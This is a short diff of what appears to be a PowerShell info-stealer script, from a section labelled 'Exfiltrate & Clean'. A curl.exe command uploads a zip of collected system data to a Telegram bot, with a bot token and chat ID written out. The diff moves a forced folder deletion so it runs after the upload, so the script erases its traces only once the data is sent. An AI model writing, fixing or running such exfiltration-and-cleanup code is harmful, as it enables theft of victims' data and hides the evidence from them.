@@ -150,5 +150,5 @@ if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
 }
 
 # 6. Exfiltrate & Clean
-Remove-Item $OutputFolder -Recurse -Force
 curl.exe -X POST https://api.telegram.org/bot7442026925:AAEkeXaAL7rGvztaF-zo1N25-ICdZWIxI2o/sendDocument -F chat_id=1003362997887 -F document=@"$ZipFile" -F caption="System Data Collection Complete"
+Remove-Item $OutputFolder -Recurse -Force
